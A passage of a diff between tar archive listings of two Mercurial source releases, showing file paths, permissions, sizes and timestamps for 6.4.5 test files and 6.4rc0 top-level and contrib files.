--rw-r--r--   0 alphare   (1000) alphare   (1000)      312 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-revert-flags.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1161 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-revert-interactive-curses.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     9633 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-revert-interactive.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)      345 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-revert-unknown.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)    32483 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-revert.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)      649 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-revisions.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1944 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-revlog-ancestry.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)      298 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-revlog-ancestry.py.out
--rw-r--r--   0 alphare   (1000) alphare   (1000)    13841 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-revlog-delta-find.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)      685 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-revlog-group-emptyiter.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1097 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-revlog-mmapindex.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)      511 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-revlog-packentry.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)    16442 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-revlog-raw.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)      154 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-revlog-raw.py.out
--rw-r--r--   0 alphare   (1000) alphare   (1000)     2918 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-revlog-v2.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     3265 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-revlog.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)      880 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-revset-dirstate-parents.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)    10504 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-revset-legacy-lookup.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     2483 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-revset-outgoing.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)    55347 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-revset.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)    34705 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-revset2.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)      768 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-rhg-no-generaldelta.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     2613 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-rhg-sparse-narrow.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)    10600 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-rhg.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)    12185 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-rollback.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     2975 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-run-tests.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    54543 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-run-tests.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     5485 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-rust-ancestor.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     4185 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-rust-discovery.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1881 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-rust-revlog.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1484 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-schemes.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     3074 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-serve.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1931 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-server-view.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)    60184 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-setdiscovery.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     8770 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-share-bookmarks.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)    19132 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-share-safe.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     7567 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-share.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)    38022 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-shelve.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)    25147 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-shelve2.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     4414 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-show-stack.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     5189 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-show-work.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     3946 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-show.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)    14157 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-sidedata-exchange.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     4210 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-sidedata.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     3274 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-simple-update.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     3059 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-simplekeyvaluefile.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    11514 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-simplemerge.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     2837 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-single-head-obsolescence-named-branch-A1.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     2815 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-single-head-obsolescence-named-branch-A2.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     3029 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-single-head-obsolescence-named-branch-A3.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     2962 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-single-head-obsolescence-named-branch-A4.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     2811 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-single-head-obsolescence-named-branch-A5.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)    10780 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-single-head.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1239 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-sparse-clear.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1582 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-sparse-clone.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1266 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-sparse-fsmonitor.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     3685 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-sparse-import.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     4696 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-sparse-merges.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     5708 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-sparse-profiles.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1592 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-sparse-requirement.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)    14311 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-sparse-revlog.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1747 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-sparse-verbose-json.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)      454 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-sparse-with-safe-share.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     9632 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-sparse.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)    27906 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-split.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     3352 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-sqlitestore.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)      565 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-ssh-batch.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)    16440 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-ssh-bundle1.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     4591 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-ssh-clone-r.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)    46502 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-ssh-proto-unbundle.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)    38702 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-ssh-proto.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1913 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-ssh-repoerror.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)    20914 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-ssh.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1517 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-sshserver.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     4720 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-stack.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     4376 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-state-extension.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     8135 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-static-http.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)    14673 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-status-color.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)      621 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-status-committed-and-ignored.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)      751 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-status-eacces.t
--rwxr-xr-x   0 alphare   (1000) alphare   (1000)      937 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-status-inprocess.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)       62 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-status-inprocess.py.out
--rw-r--r--   0 alphare   (1000) alphare   (1000)     6343 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-status-rev.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     4065 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-status-terse.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     5838 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-status-tracked-key.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)    19462 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-status.t
--rwxr-xr-x   0 alphare   (1000) alphare   (1000)     9417 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-stdio.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     3892 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-storage.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     6139 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-stream-bundle-v2.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)      451 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-strict.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1436 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-strip-branch-cache.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     5565 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-strip-cross.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)    43035 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-strip.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)    43874 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-subrepo-deep-nested-change.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)    29361 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-subrepo-git.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     3694 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-subrepo-missing.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1236 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-subrepo-paths.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)    24140 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-subrepo-recursion.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     6915 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-subrepo-relative-path.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)    18346 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-subrepo-svn.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)    53049 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-subrepo.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1518 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-symlink-os-yes-fs-no.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)      416 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-symlink-os-yes-fs-no.py.out
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1947 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-symlink-placeholder.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     5186 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-symlinks.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)    25927 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-tag.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)    32700 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-tags.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)    25985 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-template-basic.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)    43113 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-template-functions.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     6671 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-template-graph.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)    32964 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-template-keywords.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)    55565 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-template-map.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     2905 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-tools.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)    12560 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-transaction-rollback-on-revlog-split.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     2713 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-transaction-rollback-on-sigpipe.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     6387 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-transaction-safety.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     6552 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-transaction-wc-rollback-race.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)    27390 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-transplant.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     9293 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-treediscovery-legacy.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)    19979 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-treediscovery.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)    25716 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-treemanifest.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     8794 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-trusted.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     4672 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-trusted.py.out
--rw-r--r--   0 alphare   (1000) alphare   (1000)      967 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-ui-color.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)       56 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-ui-color.py.out
--rw-r--r--   0 alphare   (1000) alphare   (1000)     4831 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-ui-config.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1575 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-ui-config.py.out
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1632 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-ui-verbosity.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     4290 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-ui-verbosity.py.out
--rw-r--r--   0 alphare   (1000) alphare   (1000)     8865 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-unamend.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1397 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-unbundlehash.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)    15437 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-uncommit.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     2237 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-unified-test.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     3655 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-unionrepo.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)      900 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-unrelated-pull.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     5447 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-up-local-change.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     3456 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-update-atomic.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)    18603 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-update-branches.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1285 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-update-dest.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)      857 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-update-issue1456.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     2410 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-update-names.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1714 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-update-reverse.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)    83024 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-upgrade-repo.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1930 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-url-download.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     7801 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-url-rev.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)    14253 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-url.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)      540 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-username-newline.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     4262 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-util.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    19219 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-verify-repo-operations.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    10418 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-verify.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)    22413 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-walk.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     2028 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-walkrepo.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1157 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-websub.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     8428 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-win32text.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)    22957 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-wireproto-clientreactor.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     8572 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-wireproto-framing.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    28449 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-wireproto-serverreactor.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     2583 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-wireproto.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)       51 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-wireproto.py.out
--rw-r--r--   0 alphare   (1000) alphare   (1000)    15625 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-wireproto.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     3850 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-worker.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)    19492 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-wsgirequest.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)      264 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-xdg.t
-drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-06-22 09:18:52.444352 mercurial-6.4.5/tests/testlib/
--rw-r--r--   0 alphare   (1000) alphare   (1000)    14930 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/testlib/badserverext.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)      106 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/testlib/common.sh
--rw-r--r--   0 alphare   (1000) alphare   (1000)      819 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/testlib/crash_transaction_late.py
--rwxr-xr-x   0 alphare   (1000) alphare   (1000)     3631 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/testlib/exchange-obsmarker-util.sh
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1024 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/testlib/ext-phase-report.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1565 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/testlib/ext-sidedata-2.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     2716 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/testlib/ext-sidedata-3.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)      529 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/testlib/ext-sidedata-4.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     2438 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/testlib/ext-sidedata-5.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     3558 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/testlib/ext-sidedata.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)      667 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/testlib/ext-stream-clone-steps.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     2433 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/testlib/merge-combination-util.sh
--rw-r--r--   0 alphare   (1000) alphare   (1000)      244 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/testlib/obsmarker-common.sh
--rw-r--r--   0 alphare   (1000) alphare   (1000)    10381 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/testlib/persistent-nodemap-race-ext.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)      998 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/testlib/push-checkheads-util.sh
--rwxr-xr-x   0 alphare   (1000) alphare   (1000)     3790 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/testlib/sigpipe-remote.py
--rwxr-xr-x   0 alphare   (1000) alphare   (1000)      395 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/testlib/sigpipe-worker.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     2226 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/testlib/stream_clone_setup.sh
--rwxr-xr-x   0 alphare   (1000) alphare   (1000)      948 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/testlib/wait-on-file
--rwxr-xr-x   0 alphare   (1000) alphare   (1000)     6664 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/tinyproxy.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)      146 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/unwrap-message-id.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)      795 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/wireprotohelpers.sh
+drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-03-02 22:30:09.278632 mercurial-6.4rc0/
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      206 2023-03-02 22:29:51.000000 mercurial-6.4rc0/.arcconfig
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      343 2023-03-02 22:29:51.000000 mercurial-6.4rc0/.clang-format
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      348 2023-03-02 22:29:51.000000 mercurial-6.4rc0/.editorconfig
+drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-03-02 22:30:09.182632 mercurial-6.4rc0/.gitlab/
+drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-03-02 22:30:09.186632 mercurial-6.4rc0/.gitlab/merge_request_templates/
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      550 2023-03-02 22:29:51.000000 mercurial-6.4rc0/.gitlab/merge_request_templates/Default.md
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1078 2023-03-02 22:29:51.000000 mercurial-6.4rc0/.hgignore
+-rw-r--r--   0 alphare   (1000) alphare   (1000)   137224 2023-03-02 22:30:05.000000 mercurial-6.4rc0/.hgsigs
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    12002 2023-03-02 22:30:05.000000 mercurial-6.4rc0/.hgtags
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      614 2023-03-02 22:29:51.000000 mercurial-6.4rc0/.jshintrc
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      600 2023-03-02 22:29:51.000000 mercurial-6.4rc0/CONTRIBUTING
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1663 2023-03-02 22:29:51.000000 mercurial-6.4rc0/CONTRIBUTORS
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    18092 2023-03-02 22:29:51.000000 mercurial-6.4rc0/COPYING
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    86667 2023-03-02 22:30:08.000000 mercurial-6.4rc0/MANIFEST.in
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     9762 2023-03-02 22:29:51.000000 mercurial-6.4rc0/Makefile
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1323 2023-03-02 22:30:09.278632 mercurial-6.4rc0/PKG-INFO
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      958 2023-03-02 22:29:51.000000 mercurial-6.4rc0/README.rst
+drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-03-02 22:30:09.190632 mercurial-6.4rc0/contrib/
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     3219 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/Makefile.python
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     4067 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/all-revsets.txt
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      397 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/asv.conf.json
